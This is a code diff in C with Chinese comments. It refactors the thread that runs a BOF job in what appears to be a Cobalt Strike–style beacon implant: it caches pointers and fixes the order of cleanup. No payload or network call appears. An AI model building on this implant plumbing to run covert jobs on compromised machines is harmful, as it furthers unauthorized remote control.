@@ -131,45 +131,53 @@ typedef struct BofJobArgs {
 static DWORD WINAPI BofJobThread(PVOID param)
 {
     BofJobArgs* args = (BofJobArgs*)param;
+    BeaconContext* ctx;
+    BeaconJob* job;
+    BofJobRuntime* runtime;
     PacketList results;
     Parser parser;
     SIZE_T i;
 
     if (!args || !args->ctx || !args->job) return 0;
 
+    ctx = args->ctx;
+    job = args->job;
+    runtime = args->runtime;
+
     PlistInit(&results);
 
     /* 检查是否在启动前已被取消 */
-    if (JobIsCancelRequested(args->job)) {
+    if (JobIsCancelRequested(job)) {
         ByteBuf msg;
         BbInit(&msg);
-        BbPrintf(&msg, "BOF job %lu canceled before start", (ULONG)args->job->task_id);
-        JobEnqueueResult(args->ctx, args->job->task_id, args->job->command_id, &msg);
+        BbPrintf(&msg, "BOF job %lu canceled before start", (ULONG)job->task_id);
+        JobEnqueueResult(ctx, job->task_id, job->command_id, &msg);
         BbFree(&msg);
     } else {
         /* 执行 BOF */
         ParserInit(&parser, args->payload.data, args->payload.len);
-        results = CommandBofExecute(args->ctx, args->job->task_id, &parser, args->runtime);
+        results = CommandBofExecute(ctx, job->task_id, &parser, runtime);
 
         /* 将结果包发送到 Outbox */
         for (i = 0; i < results.count; i++) {
             if (results.items_are_final) {
                 ByteBuf moved = results.items[i];
                 BbInit(&results.items[i]);
-                OutboxEnqueue(&args->ctx->outbox, moved);
+                OutboxEnqueue(&ctx->outbox, moved);
             } else {
-                JobEnqueueResult(args->ctx, args->job->task_id,
-                                 args->job->command_id, &results.items[i]);
+                JobEnqueueResult(ctx, job->task_id,
+                                 job->command_id, &results.items[i]);
             }
         }
     }
 
-    /* 清理并完成 Job */
+    /* 固定尾序：释放结果与线程参数 -> 结束活动 -> JobComplete -> 不再访问 job */
     PlistFree(&results);
     BbFree(&args->payload);
-    RuntimeActivityEnd(args->ctx);
-    JobComplete(args->job);
-    BofRuntimeFree(args->runtime);
+    RuntimeActivityEnd(ctx);
+    JobComplete(job);
+
+    BofRuntimeFree(runtime);
     HeapFree(GetProcessHeap(), 0, args);
 
     return 0;
